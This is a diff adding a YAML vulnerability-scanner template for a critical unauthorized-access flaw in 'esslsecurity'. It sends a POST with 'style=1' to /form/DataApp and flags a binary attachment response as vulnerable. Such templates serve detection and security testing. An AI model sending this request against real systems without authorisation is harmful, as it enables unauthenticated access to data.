@@ -1,0 +1,22 @@
+name: yaml-poc-esslsecurity-esslsecurity-unauthorized_access-CT-442594
+binding: 9ce9743a-6e8c-4eba-85b8-9273a41ba34d
+detail:
+    author: system_user
+    links:
+        - https://nosec.org/home/detail/3032.html
+    vulnerability:
+        id: de4828a8-0ffb-421c-aef6-dc5d7a8cc9ee
+        level: critical
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /form/DataApp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: style=1
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("application/binary") && response.body.bcontains(b"ZK") && response.headers["Content-Disposition"].contains("attachment")
+expression: r0()
